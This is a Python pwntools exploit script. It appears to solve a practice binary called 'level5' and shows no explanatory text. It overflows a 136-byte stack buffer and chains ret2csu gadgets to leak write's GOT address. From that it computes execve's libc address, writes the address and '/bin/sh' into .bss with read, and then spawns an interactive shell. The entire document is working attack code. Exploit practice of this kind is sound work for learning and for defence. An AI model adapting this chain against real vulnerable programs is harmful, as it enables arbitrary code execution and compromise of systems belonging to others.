from pwn import *
context.log_level = 'debug'
p = process('./level5')
elf = ELF('./level5')
libc = ELF('libc.so.6')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

write_got  = elf.got['write']
print 'write_got:' + hex(write_got)
read_got = elf.got['read']
print 'read_got:' + hex(read_got)

main_addr = 0x0000000000400564
bss_addr = 0x0000000000601028

payload1 = '\x00' * 136
payload1 += p64(0x0000000000400606)+p64(0)+p64(0)+p64(1)+p64(write_got)+p64(1)+p64(write_got)+p64(8)
payload1 += p64(0x00000000004005F0) + '\x00' * 56
payload1 += p64(main_addr)

p.recvuntil('Hello, World\n')

print '\n######sending payload1######\n'
p.send(payload1)

write_addr = u64(p.recv(8))
print 'write_addr:'+hex(write_addr)
system_addr = write_addr - libc.symbols['write'] + libc.symbols['execve']
print 'system_addr:' + hex(system_addr)

p.recvuntil("Hello, World\n")

payload2 = '\x00' * 136
payload2 += p64(0x0000000000400606)+p64(0)+p64(0)+p64(1)+p64(read_got)+p64(0)+p64(bss_addr)+p64(16)
payload2 += p64(0x00000000004005F0) + '\x00' * 56
payload2 += p64(main_addr)

print '\n######sending payload2######\n'
p.send(payload2)

p.send(p64(system_addr))
p.send('/bin/sh\x00')

p.recvuntil('Hello, World\n')

payload3 = '\x00' * 136
payload3 += p64(0x0000000000400606)+p64(0)+p64(0)+p64(1)+p64(bss_addr)+p64(bss_addr+8)+p64(0)+p64(0)
payload3 += p64(0x00000000004005F0) + '\x00' * 56
payload3 += p64(main_addr)

print '\n######sending payload3######\n'
p.send(payload3)

p.interactive()